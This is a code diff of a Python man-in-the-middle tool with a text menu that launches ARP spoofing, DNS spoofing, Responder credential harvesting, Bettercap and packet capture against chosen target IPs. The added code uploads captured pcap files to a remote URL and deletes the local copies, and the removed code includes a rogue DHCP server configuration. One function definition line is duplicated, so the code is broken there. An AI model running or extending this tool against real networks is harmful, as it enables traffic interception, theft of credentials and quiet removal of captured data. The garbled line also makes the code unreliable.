@@ -68,11 +68,8 @@ class MITMTool:
     def status_updater(self):
         """Background thread to update packet count and active attacks"""
         while True:
-            # Update packet count by checking tcpdump file size or process stats
-            # For simplicity, just update every 5 seconds with dummy data
             try:
                 if 'tcpdump' in self.capture_processes:
-                    # Could parse tcpdump stats or file size here
                     self.packet_count += 10  # Dummy increment
                 else:
                     self.packet_count = 0
@@ -139,31 +136,25 @@ class MITMTool:
 
     def get_device_name(self, ip, mac):
         """Try multiple methods to get human-readable device names"""
-        # Method 1: Check DHCP hostname first
         dhcp_name = self.get_dhcp_name(mac)
         if dhcp_name and dhcp_name.lower() not in ['unknown', 'localhost', 'android']:
             return dhcp_name
             
-        # Method 2: Try NetBIOS name resolution
         netbios_name = self.get_netbios_name(ip)
         if netbios_name:
             return netbios_name
             
-        # Method 3: Try mDNS (Bonjour)
         mdns_name = self.get_mdns_name(ip)
         if mdns_name:
             return mdns_name
             
-        # Method 4: Try LLMNR
         llmnr_name = self.get_llmnr_name(ip)
         if llmnr_name:
             return llmnr_name
             
-        # Fallback to MAC vendor + IP
         return f"{self.get_device_type(mac)} Device"
 
     def get_dhcp_name(self, mac):
-        """Extract hostname from DHCP leases"""
         try:
             with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                 for line in f:
@@ -175,7 +166,6 @@ class MITMTool:
         return None
 
     def get_netbios_name(self, ip):
-        """Get NetBIOS name using nmblookup"""
         try:
             result = subprocess.run(
                 ["nmblookup", "-A", ip],
@@ -189,7 +179,6 @@ class MITMTool:
         return None
 
     def get_mdns_name(self, ip):
-        """Try to resolve mDNS (Bonjour) name"""
         try:
             result = subprocess.run(
                 ["avahi-resolve", "-a", ip],
@@ -204,40 +193,32 @@ class MITMTool:
         return None
 
     def get_llmnr_name(self, ip):
-        """Try LLMNR name resolution"""
         try:
             result = subprocess.run(
                 ["nmblookup", "-A", ip],
                 capture_output=True, text=True, timeout=2
             )
             for line in result.stdout.split('\n'):
-                if "<20>" in line:  # File Server Service
+                if "<20>" in line:
                     return line.split()[0]
         except:
             pass
         return None
 
     def enhance_device_info(self, device):
-        """Add additional identification to device info"""
         ip = device.get('ip')
         mac = device.get('mac')
         
         if not ip or not mac:
             return device
             
-        # Add device name
         device['name'] = self.get_device_name(ip, mac)
-        
-        # Add manufacturer from MAC
         device['manufacturer'] = self.get_device_type(mac)
-        
-        # Try to get operating system info
         device['os'] = self.guess_os(ip, mac)
         
         return device
 
     def guess_os(self, ip, mac):
-        """Attempt to guess operating system"""
         vendor = self.get_device_type(mac).lower()
         
         if 'apple' in vendor:
@@ -249,7 +230,6 @@ class MITMTool:
         elif 'linux' in vendor:
             return 'Linux'
             
-        # Try nmap OS detection if available
         try:
             result = subprocess.run(
                 ["nmap", "-O", "--osscan-limit", ip],
@@ -263,7 +243,6 @@ class MITMTool:
         return 'Unknown'
 
     def load_config(self):
-        """Load configuration from file"""
         try:
             with open(CONFIG_FILE) as f:
                 self.config = json.load(f)
@@ -278,7 +257,6 @@ class MITMTool:
             logger.warning("Using default configuration")
 
     def check_safety(self):
-        """Display legal disclaimers and safety checks"""
         disclaimer = """
         WARNING: This tool is for authorized security auditing and penetration testing only.
         Unauthorized use is illegal and unethical. By using this tool, you agree that:
@@ -300,16 +278,13 @@ class MITMTool:
             self.save_config()
 
     def save_config(self):
-        """Save configuration to file"""
         os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
         with open(CONFIG_FILE, 'w') as f:
             json.dump(self.config, f, indent=4)
 
     def setup_environment(self):
-        """Create necessary directories and check dependencies"""
         os.makedirs(DATA_DIR, exist_ok=True)
         
-        # Check for required tools
         required_tools = [
             'arpspoof', 'dsniff', 'nmap', 'tcpdump', 
             'bettercap', 'responder', 'tailscale', 'iwlist',
@@ -327,7 +302,6 @@ class MITMTool:
             sys.exit(1)
 
     def check_tool_installed(self, tool):
-        """Check if a command line tool is installed"""
         try:
             subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             return True
@@ -335,7 +309,6 @@ class MITMTool:
             return False
 
     def detect_interfaces(self):
-        """Detect available network interfaces"""
         self.interfaces = {}
         try:
             interfaces = netifaces.interfaces()
@@ -360,7 +333,6 @@ class MITMTool:
             return False
 
     def setup_bridge(self):
-        """Bridge two Ethernet interfaces"""
         ethernet_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'ethernet']
         
         if len(ethernet_ifaces) < 2:
@@ -383,8 +355,8 @@ class MITMTool:
             logger.error(f"Failed to create bridge: {str(e)}")
             return False
 
+    # --- Updated network_scan with formatted ARP scan and faster Nmap ---
     def network_scan(self):
-        """Perform network scan using nmap and arp-scan"""
         if not self.interfaces:
             logger.error("No interfaces detected")
             return
@@ -397,22 +369,37 @@ class MITMTool:
                 ["sudo", "arp-scan", "--interface", interface, "--localnet"],
                 capture_output=True, text=True
             )
-            print(arp_scan.stdout)
+            raw_arp_output = arp_scan.stdout
             
-            logger.info("Running Nmap scan...")
-            subnet = self.get_subnet(interface)
-            if subnet:
-                nmap_scan = subprocess.run(
-                    ["sudo", "nmap", "-sV", "-O", subnet],
-                    capture_output=True, text=True
-                )
-                print(nmap_scan.stdout)
+            # Clear screen before printing
+            os.system('clear')
+            print(f"{'IP Address':<15} {'MAC Address':<18} {'Vendor'}")
+            print("-" * 50)
+            live_hosts = []
+            for line in raw_arp_output.splitlines():
+                match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})\s*(.*)", line, re.I)
+                if match:
+                    ip, mac, vendor = match.groups()
+                    print(f"{ip:<15} {mac:<18} {vendor}")
+                    live_hosts.append(ip)
+            
+            if not live_hosts:
+                logger.warning("No live hosts found for Nmap scan.")
+                return
+            
+            logger.info(f"Running Nmap scan on {len(live_hosts)} hosts...")
+            nmap_cmd = ["sudo", "nmap", "-T4", "-F"] + live_hosts
+            nmap_scan = subprocess.run(
+                nmap_cmd,
+                capture_output=True, text=True
+            )
+            print("\nNmap Scan Results:\n")
+            print(nmap_scan.stdout)
                 
         except Exception as e:
             logger.error(f"Scanning failed: {str(e)}")
 
     def get_subnet(self, interface):
-        """Calculate subnet from interface IP and netmask"""
         if interface not in self.interfaces:
             return None
             
@@ -427,7 +414,6 @@ class MITMTool:
         return None
 
     def arp_spoof(self, target_ip, gateway_ip):
-        """Start ARP spoofing between target and gateway"""
         if not self.check_target_safety(target_ip):
             logger.error(f"Target {target_ip} is not in allowed networks")
             return
@@ -447,7 +433,6 @@ class MITMTool:
             return False
 
     def check_target_safety(self, target_ip):
-        """Check if target is in allowed networks"""
         if not self.config.get("allowed_networks"):
             return True
             
@@ -457,7 +442,6 @@ class MITMTool:
         return False
 
     def start_packet_capture(self, interface="mitm-bridge", filename=None):
-        """Start packet capture with tcpdump"""
         if not filename:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
@@ -478,7 +462,6 @@ class MITMTool:
             return False
 
     def start_responder(self, interface="mitm-bridge"):
-        """Start Responder for credential harvesting"""
         try:
             cmd = [
                 "sudo", "responder", "-I", interface,
@@ -493,8 +476,8 @@ class MITMTool:
             logger.error(f"Failed to start Responder: {str(e)}")
             return False
 
+    # --- Fixed start_bettercap to accept interface and optional script_path ---
     def start_bettercap(self, interface="mitm-bridge", script_path=None):
-        """Start Bettercap with optional script for advanced MITM attacks"""
         try:
             cmd = ["sudo", "bettercap", "-iface", interface]
             if script_path:
@@ -507,176 +490,131 @@ class MITMTool:
             logger.error(f"Failed to start Bettercap: {str(e)}")
             return False
 
-    def start_dns_spoof(self, interface="mitm-bridge", hosts_file="/etc/mitm_tool/dns_hosts"):
-        """Start DNS spoofing using Bettercap caplet"""
-        # Create a simple Bettercap caplet for DNS spoofing
-        caplet_content = f"""
-set dns.spoof.domains *
-set dns.spoof.address 192.168.1.1
-dns.spoof on
-"""
-        caplet_path = "/tmp/dns_spoof.cap"
+    def start_dns_spoof(self, interface="mitm-bridge",    def start_dns_spoof(self, interface="mitm-bridge", hosts_file=None):
         try:
-            with open(caplet_path, "w") as f:
-                f.write(caplet_content)
-            return self.start_bettercap(interface=interface, script_path=caplet_path)
+            cmd = ["sudo", "dnsspoof", "-i", interface]
+            if hosts_file:
+                cmd.extend(["-f", hosts_file])
+            self.capture_processes['dnsspoof'] = subprocess.Popen(cmd)
+            self.active_attacks.add('DNS Spoofing')
+            logger.info(f"DNS spoofing started on {interface} with hosts file {hosts_file}")
+            return True
         except Exception as e:
             logger.error(f"Failed to start DNS spoofing: {str(e)}")
             return False
 
-    def start_rogue_dhcp(self, interface="mitm-bridge"):
-        """Start a rogue DHCP server using dnsmasq"""
-        dhcp_conf = f"""
-interface={interface}
-dhcp-range=192.168.1.100,192.168.1.200,12h
-dhcp-option=3,192.168.1.1
-dhcp-option=6,192.168.1.1
-"""
-        conf_path = "/tmp/rogue_dhcp.conf"
-        try:
-            with open(conf_path, "w") as f:
-                f.write(dhcp_conf)
-            cmd = ["sudo", "dnsmasq", "-C", conf_path, "-d"]
-            self.capture_processes['rogue_dhcp'] = subprocess.Popen(cmd)
-            self.active_attacks.add('Rogue DHCP')
-            logger.info(f"Rogue DHCP server started on {interface}")
-            return True
-        except Exception as e:
-            logger.error(f"Failed to start rogue DHCP server: {str(e)}")
-            return False
-
     def stop_all_attacks(self):
-        """Stop all running attack processes"""
         for name, proc in self.capture_processes.items():
             try:
                 proc.terminate()
                 proc.wait(timeout=5)
-                logger.info(f"Stopped {name} process")
-            except Exception:
-                proc.kill()
-                logger.info(f"Killed {name} process")
+                logger.info(f"Stopped {name}")
+            except Exception as e:
+                logger.error(f"Failed to stop {name}: {str(e)}")
         self.capture_processes.clear()
         self.active_attacks.clear()
-        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
-        logger.info("All attacks stopped and IP forwarding disabled")
 
-    def show_status(self, stdscr):
-        """Display real-time status in curses window"""
-        stdscr.clear()
-        stdscr.border(0)
-        stdscr.addstr(1, 2, "MITM Network Auditing Tool - Status", curses.A_BOLD)
-        stdscr.addstr(3, 4, f"Active Attacks: {', '.join(self.active_attacks) if self.active_attacks else 'None'}")
-        stdscr.addstr(4, 4, f"Packet Captured (approx.): {self.packet_count}")
-        stdscr.addstr(5, 4, f"Detected Interfaces: {', '.join(self.interfaces.keys())}")
-        stdscr.addstr(7, 4, "Press 'q' to return to menu")
-        stdscr.refresh()
+    def upload_captures(self):
+        if not self.config.get("remote_upload", False):
+            logger.info("Remote upload disabled in config")
+            return False
 
-    def tui_main(self, stdscr):
-        """Main curses TUI loop"""
-        curses.curs_set(0)
-        current_row = 0
-        menu = [
-            "Scan Network",
-            "Start ARP Spoofing",
-            "Start Packet Capture",
-            "Start Responder (Credential Harvesting)",
-            "Start DNS Spoofing",
-            "Start Rogue DHCP Server",
-            "Stop All Attacks",
-            "Show Status",
-            "Exit"
-        ]
+        try:
+            for filename in os.listdir(DATA_DIR):
+                if filename.endswith(".pcap"):
+                    filepath = os.path.join(DATA_DIR, filename)
+                    with open(filepath, 'rb') as f:
+                        files = {'file': (filename, f)}
+                        response = requests.post(REMOTE_UPLOAD_URL, files=files)
+                        if response.status_code == 200:
+                            logger.info(f"Uploaded {filename} successfully")
+                            os.remove(filepath)
+                        else:
+                            logger.error(f"Failed to upload {filename}: {response.status_code}")
+            return True
+        except Exception as e:
+            logger.error(f"Upload failed: {str(e)}")
+            return False
 
-        def print_menu():
-            stdscr.clear()
-            stdscr.border(0)
-            stdscr.addstr(1, 2, ASCII_ART, curses.color_pair(2))
-            stdscr.addstr(10, 2, "Use arrow keys to navigate and Enter to select", curses.A_DIM)
-            for idx, item in enumerate(menu):
-                x = 4
-                y = 12 + idx
-                if idx == current_row:
-                    stdscr.attron(curses.color_pair(1))
-                    stdscr.addstr(y, x, item)
-                    stdscr.attroff(curses.color_pair(1))
-                else:
-                    stdscr.addstr(y, x, item)
-            stdscr.refresh()
-
-        curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)
-        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
-
+    def main_menu(self):
         while True:
-            print_menu()
-            key = stdscr.getch()
+            print(ASCII_ART)
+            print("1. Detect Interfaces")
+            print("2. Setup Bridge")
+            print("3. Network Scan")
+            print("4. Start ARP Spoofing")
+            print("5. Start Packet Capture")
+            print("6. Start Responder")
+            print("7. Start Bettercap")
+            print("8. Start DNS Spoofing")
+            print("9. Stop All Attacks")
+            print("10. Upload Captures")
+            print("0. Exit")
+            choice = input("Select an option: ").strip()
 
-            if key == curses.KEY_UP and current_row > 0:
-                current_row -= 1
-            elif key == curses.KEY_DOWN and current_row < len(menu) - 1:
-                current_row += 1
-            elif key in [curses.KEY_ENTER, 10, 13]:
-                stdscr.clear()
-                stdscr.refresh()
-                if current_row == 0:
-                    self.network_scan()
-                    stdscr.addstr(2, 2, "Network scan completed. Press any key to continue.")
-                    stdscr.getch()
-                elif current_row == 1:
-                    stdscr.addstr(2, 2, "Enter target IP: ")
-                    curses.echo()
-                    target_ip = stdscr.getstr(2, 20, 15).decode()
-                    stdscr.addstr(3, 2, "Enter gateway IP: ")
-                    gateway_ip = stdscr.getstr(3, 20, 15).decode()
-                    curses.noecho()
-                    if self.arp_spoof(target_ip, gateway_ip):
-                        stdscr.addstr(5, 2, "ARP spoofing started. Press any key to continue.")
-                    else:
-                        stdscr.addstr(5, 2, "Failed to start ARP spoofing. Press any key to continue.")
-                    stdscr.getch()
-                elif current_row == 2:
-                    if self.start_packet_capture():
-                        stdscr.addstr(2, 2, "Packet capture started. Press any key to continue.")
-                    else:
-                        stdscr.addstr(2, 2, "Failed to start packet capture. Press any key to continue.")
-                    stdscr.getch()
-                elif current_row == 3:
-                    if self.start_responder():
-                        stdscr.addstr(2, 2, "Responder started. Press any key to continue.")
-                    else:
-                        stdscr.addstr(2, 2, "Failed to start Responder. Press any key to continue.")
-                    stdscr.getch()
-                elif current_row == 4:
-                    if self.start_dns_spoof():
-                        stdscr.addstr(2, 2, "DNS spoofing started. Press any key to continue.")
-                    else:
-                        stdscr.addstr(2, 2, "Failed to start DNS spoofing. Press any key to continue.")
-                    stdscr.getch()
-                elif current_row == 5:
-                    if self.start_rogue_dhcp():
-                        stdscr.addstr(2, 2, "Rogue DHCP server started. Press any key to continue.")
-                    else:
-                        stdscr.addstr(2, 2, "Failed to start rogue DHCP server. Press any key to continue.")
-                    stdscr.getch()
-                elif current_row == 6:
-                    self.stop_all_attacks()
-                    stdscr.addstr(2, 2, "All attacks stopped. Press any key to continue.")
-                    stdscr.getch()
-                elif current_row == 7:
-                    self.show_status(stdscr)
-                    while True:
-                        k = stdscr.getch()
-                        if k == ord('q'):
-                            break
-                elif current_row == 8:
-                    self.stop_all_attacks()
-                    break
-
-def main():
-    tool = MITMTool()
-    if not tool.detect_interfaces():
-        print("No suitable network interfaces detected. Exiting.")
-        sys.exit(1)
-    curses.wrapper(tool.tui_main)
+            if choice == "1":
+                if self.detect_interfaces():
+                    print("Interfaces detected:")
+                    for iface, info in self.interfaces.items():
+                        print(f"{iface}: {info}")
+                else:
+                    print("No interfaces detected.")
+            elif choice == "2":
+                if self.setup_bridge():
+                    print("Bridge setup successfully.")
+                else:
+                    print("Failed to setup bridge.")
+            elif choice == "3":
+                self.network_scan()
+            elif choice == "4":
+                target_ip = input("Enter target IP: ").strip()
+                gateway_ip = input("Enter gateway IP: ").strip()
+                if self.arp_spoof(target_ip, gateway_ip):
+                    print("ARP spoofing started.")
+                else:
+                    print("Failed to start ARP spoofing.")
+            elif choice == "5":
+                iface = input("Enter interface for capture (default mitm-bridge): ").strip() or "mitm-bridge"
+                if self.start_packet_capture(interface=iface):
+                    print("Packet capture started.")
+                else:
+                    print("Failed to start packet capture.")
+            elif choice == "6":
+                iface = input("Enter interface for Responder (default mitm-bridge): ").strip() or "mitm-bridge"
+                if self.start_responder(interface=iface):
+                    print("Responder started.")
+                else:
+                    print("Failed to start Responder.")
+            elif choice == "7":
+                iface = input("Enter interface for Bettercap (default mitm-bridge): ").strip() or "mitm-bridge"
+                script = input("Enter Bettercap script path (optional): ").strip() or None
+                if self.start_bettercap(interface=iface, script_path=script):
+                    print("Bettercap started.")
+                else:
+                    print("Failed to start Bettercap.")
+            elif choice == "8":
+                iface = input("Enter interface for DNS spoofing (default mitm-bridge): ").strip() or "mitm-bridge"
+                hosts_file = input("Enter hosts file path (optional): ").strip() or None
+                if self.start_dns_spoof(interface=iface, hosts_file=hosts_file):
+                    print("DNS spoofing started.")
+                else:
+                    print("Failed to start DNS spoofing.")
+            elif choice == "9":
+                self.stop_all_attacks()
+                print("All attacks stopped.")
+            elif choice == "10":
+                if self.upload_captures():
+                    print("Uploads completed.")
+                else:
+                    print("Upload failed or disabled.")
+            elif choice == "0":
+                self.stop_all_attacks()
+                print("Exiting...")
+                break
+            else:
+                print("Invalid choice. Please try again.")
+            input("Press Enter to continue...")
 
 if __name__ == "__main__":
-    main()
+    tool = MITMTool()
+    tool.main_menu()
